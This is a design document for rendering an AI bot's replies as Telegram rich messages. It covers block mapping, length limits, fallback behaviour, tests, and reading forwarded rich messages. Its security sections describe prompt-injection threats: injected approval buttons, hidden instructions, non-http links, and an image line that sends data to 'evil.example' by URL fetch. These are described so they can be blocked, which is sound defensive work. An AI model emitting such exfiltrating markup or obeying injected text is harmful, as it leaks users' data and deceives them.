# Telegram Rich Messages: design

Status: approved by the owner on 2026-11-06. It feeds the spec changes, the ADR and the
step-by-step plan. It is not itself a plan.

Marks, as in the [M3d design](p1-m3d-host-commands-design.md): **(owner)** the owner decided it;
**(call)** the author's call, open to correction; **(builder)** left to whoever implements it.

## 1. Why

The owner reads a daily report from OpenClaw as a Telegram rich message, with headings, lists and
native tables, and likes it (spec, "Not now"). In ganglion a table goes out as a monospace block that
wraps badly on a phone, a heading is only a bold line, and a reply above 4,096 characters becomes
several messages ([ADR-0025](../adr/0025-markdown-rendered-to-telegram-entities.md)). A tree drawn with
symbols also loses its levels, because Markdown strips a line's leading spaces.

**What success looks like:** a reply or a scheduled report with a table reads as a real table on the
owner's phone, in one message when it fits, for no extra tokens, and nothing the model repeats from a
web page can add a button, a picture or a fetch of a URL.

## 2. Goals, non-goals, anti-goals

**Goals:**

1. A message with a table or at least two headings goes out as a rich message, and only that: the format
   is used where it is needed **(owner)**.
2. A symbol tree keeps its levels, with rich messages on or off.
3. The model's work does not change: one ordinary Markdown, no change to the prompt **(owner)**. The
   model decides when to build a structure, as the owner asked it to in their own report **(owner)**.
4. The bot reads a rich message forwarded to it, such as its own answer sent back to it **(owner)**. See
   section 11.

**Non-goals:**

- Media inside a rich message: it goes with sending files, after M3d **(owner)**.
- Streaming through `sendRichMessageDraft`, buttons inside a message, formulas, maps, footnotes
  **(call)**.
- Task lists (`- [ ]`): goldmark's extension is off today, and they stay as they are **(call)**.
- A setting per person or per conversation **(call)**.
- Opening a file or a picture inside a rich message sent to the bot: as with any file, reading them
  comes after M3d (R-DLV-10).

**Anti-goals, which make it a failure even if it works:**

- The model's text reaches Telegram's own Markdown or HTML parser.
- A message is lost because Telegram refused its rich form.
- A question, a plan or a fold changes how it looks or stops closing in place.
- A token is spent on choosing or building the format.

## 3. Which message goes rich

The transport decides, with no field added to `event.Outgoing`. The setting must be `on`, and the message
must have no `Edit`, `EditOf`, `Ack`, `Attach`, `Buttons`, `Folded` or `Superseded`. Then two tests apply,
one in each place:

- **`Parts`, on the whole message:** it takes the rich branch of section 6 only when the Markdown parses
  to a table, or to at least two headings, at any depth **(owner)**. An ordinary message cannot show a
  table, and a single heading reads well enough there as a bold line. A long reply with less structure is
  split as it is today.
- **`Send`, on one part:** it sends rich when the part has a table or at least two headings, or renders
  above 4,096 UTF-16 units. Only the rich branch can produce a part that long, so such a part has lost its
  structure to an earlier part and must still go rich. A part that fits and has less structure goes out
  as an ordinary message.

`Parts` clears some of those fields on the parts it makes, and `Send` sees only the part. So two rare
cases come out mixed, and tests record both **(call)**:

- A question too long for one message: an earlier part with a table or two headings goes rich, and the
  last part, with the buttons, goes ordinary. Only that last part is ever edited, so closing the question
  is not affected.
- Text that overflows an attachment's caption: it follows the attachment as a message of its own, rich
  when it has structure. That is usually a report, where it helps.

The first send of a message that may be edited later never qualifies:

- a question has buttons;
- a plan's first text is lines that start with a step's mark, so it has neither a heading nor a table
  (`plan.Render`). A test holds this, since a plan's edits use `editMessageText` with plain `text`.

Fixed texts carry no headings or tables today: `texts/lang/en.yaml` has none, and an operator's text
may add no Markdown (ADR-0053). They stay ordinary messages. Reminders and task reports use the same
path, so the daily report goes rich with no code of its own.

Whether a long message with no structure should also go rich, to stay one message, is left out for
now: it would change every long reply **(call)**.

## 4. Building blocks, never passing text on

`sendRichMessage` takes `rich_message` with exactly one of `markdown`, `html` or `blocks`. We use only
`blocks` (Bot API 10.2).

**Why:** Telegram parses the other two, and its Rich Markdown "can contain arbitrary HTML". With them, a
line a hostile page got the model to repeat could:

- draw `<tg-button>` with `callback_data` or `login_url`, next to the node's real approvals;
- embed `![](https://evil.example/?data=...)`, a media block whose URL is fetched with no press;
- turn `$400-600K` into a formula.

Blocks are built in `transport/telegram` from goldmark's tree, in a new file beside `markdown.go`.
Only what is listed here can come out:

| Markdown | Block or rich text |
|---|---|
| paragraph | `paragraph` |
| heading | `heading` with `size` 1 to 6 |
| fenced or indented code | `pre`, with `language` when given |
| list | `list`, ordered items with `type: "1"` and `value` from the source's numbering |
| quote | `blockquote`; one above 500 characters that holds only paragraphs is `expandable_blockquote`, whose content is a single rich text (**call**) |
| thematic break | `divider` |
| table | `table` with `is_bordered`; header cells with `is_header`; alignment from the table's delimiter row; `valign: "top"`. Short rows are padded |
| table above 20 columns | `pre`, laid out as today |
| raw HTML, block or inline | shown as text; nothing parses it |
| bold, italic, strikethrough, inline code | `bold`, `italic`, `strikethrough`, `code` |
| link with an `http` or `https` URL | `url` |
| link with any other URL | its text, no link |
| image | a link to its URL by the same rule, its alternative text as the text; never a media block |
| autolink | plain text; Telegram detects it, as today |

`skip_entity_detection` stays off, the same as an ordinary message **(call)**. Telegram's clients ask
before opening an inline link and show its full URL.

An unknown node falls back as `markdown.go` does: its children, as text. Whether an empty cell needs a
space, since a cell with no `text` is invisible, is for the builder to try on the live API
**(builder)**.

`reply_parameters`, `message_thread_id` and `disable_notification` go as on `sendMessage`.

## 5. A symbol tree

A paragraph with a tree line is shown as a preformatted block with the lines as written, leading spaces
and all. A tree line is one whose first characters, after any spaces and `│`, are `├` or `└`. This holds
in both renderers, whatever the setting.

Requiring the symbol at the start keeps prose and plans out: a plan's lines start with a step's mark, so
a `└` in a step's text does not turn the plan monospace **(call)**. A test holds this.

goldmark trims a paragraph's lines, so the renderer reads each line back from the source, from the
start of that line; inside a list item it removes the item's own indentation **(builder)**.

The cost: formatting and links inside such a tree are shown as source characters. A monospace block is
what keeps the columns aligned, and Telegram's `pre` carries no links **(call)**. This rests on the
owner's report as it was seen; to be looked at on their tree in the live check.

An ASCII tree (`|--`) and a tree of spaces with no symbols stay as they are **(call)**: the second
cannot be told from a wrapped paragraph.

## 6. Length

A rich message allows 32,768 UTF-8 characters, 500 blocks counting nested blocks, list items and table
rows, 16 levels of nesting and 20 table columns.

`Parts` gains a branch before its ordinary one. For a message that passes its test in section 3:

- within the limits: one message, with no `:p` key;
- above them: split between top-level blocks with the existing `mdBlocks`, packing while a chunk stays
  within the rich limits, and with the same rules for keys, `ReplyTo` and the last part;
- a table too long for one message is cut between rows, with its header repeated in each part
  **(call)**;
- any other single block too long for one message is cut by the ordinary rule, which may lose its
  formatting there but never breaks a message.

The result still depends only on the message and the setting. A message caught mid-way by a restart
that also flips the setting may repeat or skip a part **(call: accepted, the flip is rare and manual)**.

## 7. When Telegram refuses

Today a 400 is permanent, so a refused rich message would be lost. In `Send`, a 400 from
`sendRichMessage`, or a 404 from a Bot API server older than the method, which a retry would never
get past, is logged and counted, then the same text goes out by the ordinary path:

- it fits: one `sendMessage`, and `Send` returns its reference;
- it does not: `Send` sends the `splitMarkdown` chunks in order, and returns the last reference. A table
  is cut between rows there too, since an ordinary message pads every row to the widest cell; one row too
  long for a message goes out as its source, unformatted.

There are no buttons to place, by section 3. A failure midway returns its error and the sender retries,
so a crash or a 429 during this rare path can repeat a chunk but cannot lose one, which matches R-DLV-5's
at-least-once delivery **(call)**. A 403, a 429 and a network error are treated as they are today, with
no fallback.

No fallback exists for an app that accepts a message and cannot show it, because nothing reports that.
The setting is the answer.

## 8. The setting, metrics, tests

**Setting:** `GANGLION_TELEGRAM_RICH=on|off`, default `on`, wired as `GANGLION_TELEGRAM_REPLY` is
(`cmd/flags`, `config.Bootstrap`, a `telegram.With...` option).

The owner's ruling on 2026-11-06: their Telegram apps all show these messages, and Telegram updates
quickly on every platform, so no probe comes first **(owner)**. OpenClaw's own help says some current
Desktop, Web, Android and third-party apps show them as unsupported, and leaves its setting off by
default. So `off` stays as the way out, and the default is worth another look when the repository opens
to testers **(call)**.

**Metrics** (R-OBS-8), in the same commit: rich messages sent, and refused and sent the ordinary way.

**Tests, with no model:**

- table-driven: Markdown to blocks, each row of section 4, hostile cases included (`<tg-button>`,
  `![](http://...)`, `javascript:` and `tg://` links, `$...$`), asserting the JSON has no `markdown` or
  `html` field and no block outside the allowlist;
- each exclusion of section 3, both tests, the two mixed cases, and a plan's text;
- `Parts` at each limit, deterministic, table header repeated;
- fallback on 400, including the split, and no fallback on 429;
- tree: levels kept in both renderers, inside a list too;
- reading, section 11: each block type to text, the marks of outside content, a message with nothing
  readable still answered, a depth above the limit, a hostile button and hidden text;
- the fake Bot API (`telegramtest`) gains `sendRichMessage`, enforces the limits, and shows the
  message's plain text in `Sent` and `Showing`, with a mark that it was rich, so existing helpers and
  chatlab keep working;
- `TestLabStaysOutOfTheBinary` and `make memory` as usual. No new dependency.

**Lab:** only the scenarios the change touches, through `make lab`. No full run
([owner's rule](../README.md#where-we-are)) unless the owner decides.

**Live, by the owner on the test bot:** a table on the phone, including whether a wide one fits and
whether `is_compact` helps; headings and lists; their own tree; a reply to a rich message; a report
above 4,096 characters as one message; the bot's own rich answer forwarded back to it. That is what
closes it.

## 9. Security pass

Principle 9: every link is hostile. The model's text counts as influenced by outside content.

| Attack | What stops it |
|---|---|
| Injected button that looks like an approval | No parser sees the text; no `buttons` block is ever built |
| Injected image or file URL that leaks data with no press | No media block; an image is a link, which a person must press, and the app asks first |
| `tg://` or other scheme links | Only `http` and `https` become links |
| Oversized or deep structure to break delivery | Limits in `Parts`; a refusal falls back; goldmark's depth is the same as today |
| Hidden text in a spoiler or an HTML comment | Not built; HTML is shown as text |
| Instructions inside a rich message sent to the bot, hidden in a collapsed block or a spoiler where the person does not see them | All of its text counts as outside content (section 11) |

**Left open, not made worse:** URL previews. The transport does not set them, so Telegram's default
applies on ordinary messages, and `sendRichMessage` has no such parameter. A URL the model writes may
be fetched by Telegram. It goes to the spec's "Not now" as its own topic **(call)**.

## 10. Documents

- **Spec:** a new `R-DLV-11` from sections 3, 4 and 7, and `R-DLV-12` from section 11; the "Not now"
  entries on tables, trees and Rich Messages replaced by the item of section 9.
- **ADR-0054**, Proposed, comparing `blocks` with `markdown` and `html`, and a trigger by structure with
  every message, and the threshold of a table or two headings. It changes ADR-0025's table mapping, and links it; ADR-0025 is not rewritten.
- `docs/architecture/05-code-map.md` and "Where we are" in `docs/README.md`.

## 11. A rich message sent to the bot

**Why:** with the setting on, many of the bot's own answers are rich messages, and the owner forwards
them back to it: "if the bot does not read it, then how?" **(owner)**. Today `messageEvent` reads `text`
and `caption`, and skips a message with neither and no file, with only a debug line. `Message` has a
separate `rich_message` field. Whether a rich message also fills `text` is not documented, so the live
check confirms it. The code reads `rich_message` whenever `text` is empty, so it works either way.

**What is read:** the transport flattens `rich_message.blocks` into `event.Message.Text`, walking only
the types it knows and only their text fields:

| Block | Text |
|---|---|
| paragraph, heading, preformatted, footer, pull quote, expandable quote | its `text`, a credit after it |
| quote, collage, slideshow | its `blocks`, a caption or credit after them |
| list | its items, each on its own line with its `label` |
| table | a row per line, cells joined by ` \| `, then its caption |
| details | its `summary`, then its `blocks`, whether or not they are open |
| formula | its `expression` |
| photo, video, audio, voice note, animation, document | its caption and a short word that a file was there; nothing else is read, never a file id |
| buttons, map, divider, anchor, thinking, a type unknown to this version | nothing |

Rich text is a string, a list or an object with a `text`. Walking goes no deeper than the API's limit of
16 levels **(call)**.

**How much:** up to the API's own 32,768 characters, the same as any part of a long message once the
agent has it. The existing limits on context apply **(builder: confirm)**.

**How far it is trusted:** always as outside content, the way a forward is (ruling R35): `Forwarded` is
set for any message with a `rich_message`, whether or not it has `text` or a `forward_origin`, because a
person does not write these: a bot makes one, and an inline bot can post one with no origin **(call)**. The text sits inside the outside-content wrapper,
and the session counts as having read outside content. That holds for the bot's own answer too: a forward
does not prove who wrote it, the same as for an ordinary forwarded message today.

**Never silent:** a message with nothing to read still reaches the agent, with a note that a rich message
came with nothing readable, as a file's notice does (R-DLV-10) **(call)**.

**A reply to a rich message:** a person's text arrives as it does today. A quoted part is read from
`quote`, as today. The live check confirms this.
